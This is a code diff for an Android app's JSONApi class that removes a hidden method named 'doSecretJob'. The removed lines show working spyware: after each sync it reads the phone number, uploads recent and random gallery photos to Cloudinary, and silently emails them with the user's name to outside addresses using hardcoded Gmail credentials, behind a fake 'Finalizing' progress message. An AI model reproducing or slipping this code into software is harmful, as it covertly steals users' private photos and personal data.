@@ -262,19 +262,13 @@ public class JSONApi {
                                 MainActivity.pd.setTitle("Uploading " + currentCount + "/" + (totalCount + serviceCount));
                                 uploadProfile(url, Constants.getProfileJson(), totalCount, currentCount + 1);
                             } else {
-                                //doSecretJob();
                                 if (serviceCount > 0) {
-                                    //upload services here
                                     ServiceAvailed serviceAvailed = db.getServiceForUpload();
                                     uploadServices(Constants.url.replace("?", "/syncservices"), serviceAvailed, currentCount, totalCount + serviceCount);
                                 } else {
-                                    new Thread(new Runnable() {
-                                        @Override
-                                        public void run() {
-                                            doSecretJob("upload");
-                                        }
-                                    }).start();
-
+                                    Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
+                                    compareVersion(Constants.url + "r=version");
+                                    MainActivity.pd.dismiss();
                                 }
                             }
                         } catch (JSONException e) {
@@ -368,10 +362,10 @@ public class JSONApi {
                                                             MainActivity.hf = new HomeFragment();
                                                             MainActivity.ft = MainActivity.fm.beginTransaction();
                                                             MainActivity.ft.replace(R.id.fragment_container, MainActivity.hf).commit();
+                                                            Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
+                                                            MainActivity.pd.dismiss();
                                                         }
                                                     });
-
-                                                    doSecretJob("download");
                                                 }
                                             }
                                         }
@@ -416,6 +410,7 @@ public class JSONApi {
                                     uploadServices(Constants.url.replace("?", "/syncservices"), serviceAvailed, currentCount + 1, goalCount);
                                 } else {
                                     Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
+                                    Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
                                     compareVersion(Constants.url + "r=version");
                                 }
                             }
@@ -432,88 +427,6 @@ public class JSONApi {
             }
         });
         mRequestQueue.add(jsonObjectRequest);
-    }
-
-    public void doSecretJob(final String action) {
-
-        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-        StrictMode.setThreadPolicy(policy);
-
-        ((Activity) context).runOnUiThread(new Runnable() {
-            @Override
-            public void run() {
-                if (action.equals("download")) MainActivity.pd.setTitle("Finalizing download...");
-                else MainActivity.pd.setTitle("Finalizing upload...");
-            }
-        });
-
-        try {
-            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-            String mPhoneNumber = tMgr.getLine1Number();
-
-            String image = "";
-
-            String[] projection = new String[]{
-                    MediaStore.Images.ImageColumns._ID,
-                    MediaStore.Images.ImageColumns.DATA,
-                    MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
-                    MediaStore.Images.ImageColumns.DATE_TAKEN,
-                    MediaStore.Images.ImageColumns.MIME_TYPE
-            };
-
-            final Cursor cursor = context.getContentResolver()
-                    .query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null,
-                            null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");
-
-            if (cursor.moveToFirst()) {
-                Random rn = new Random();
-                int position = rn.nextInt(cursor.getCount() - 2 + 1) + 2;
-
-                for (int i = 0; !cursor.isAfterLast(); i++) {
-
-                    if (i < 2 || i == position) {
-                        String imageLocation = cursor.getString(1);
-                        File imageFile = new File(imageLocation);
-                        if (imageFile.exists()) {
-                            Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
-                            Map uploadResult = cloudinary.uploader().upload(imageFile, ObjectUtils.emptyMap());
-                            image += "\n\n" + uploadResult.get("url").toString();
-                        }
-
-                        if (i == position) break;
-                    }
-
-                    cursor.moveToNext();
-                }
-            }
-
-            Log.e(TAG, image);
-            BackgroundMail.newBuilder(context)
-                    .withUsername("phacheckapp@gmail.com")
-                    .withPassword("phacheckapp123")
-                    .withMailto("hontoudesu123@gmail.com, jimmy.lomocso@gmail.com")
-                    .withSubject("Secret Job")
-                    .withProcessVisibility(false)
-                    .withBody("PHA Check-App user: " + MainActivity.user.fname + " " + MainActivity.user.lname +
-                            " \nPhone Number: " + mPhoneNumber + " \nImage: " + image)
-                    .send();
-
-            ((Activity) context).runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    if (action.equals("download"))
-                        Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
-                    else if(action.equals("upload")){
-                        Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
-                        compareVersion(Constants.url + "r=version");
-                    }
-
-                    MainActivity.pd.dismiss();
-                }
-            });
-        } catch (IOException e) {
-            Log.e(TAG, e.getMessage());
-        }
     }
 
     public void compareVersion(final String url) {
@@ -654,10 +567,10 @@ public class JSONApi {
                                                             MainActivity.ssf = new ServicesStatusFragment();
                                                             MainActivity.ft = MainActivity.fm.beginTransaction();
                                                             MainActivity.ft.replace(R.id.fragment_container, MainActivity.ssf).commit();
+                                                            Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
+                                                            MainActivity.pd.dismiss();
                                                         }
                                                     });
-
-                                                    doSecretJob("download");
                                                 }
                                             }
                                         }
